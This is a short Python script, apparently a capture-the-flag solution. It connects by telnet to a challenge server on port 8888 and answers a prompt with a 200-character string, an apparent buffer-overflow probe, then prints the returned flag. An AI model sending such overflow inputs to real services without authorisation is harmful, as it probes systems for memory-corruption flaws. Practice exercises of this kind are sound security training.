#!/usr/bin/env python3
import telnetlib

HOST = "0xhorizon.eu"
PORT = 8888

# Connecting
tn = telnetlib.Telnet(HOST, PORT)
data = tn.read_until(b"?").decode('ascii')

# Sending
name = 'q'*200
tn.write((f'{name}\n').encode())

print(tn.read_until(b"}",3).decode())    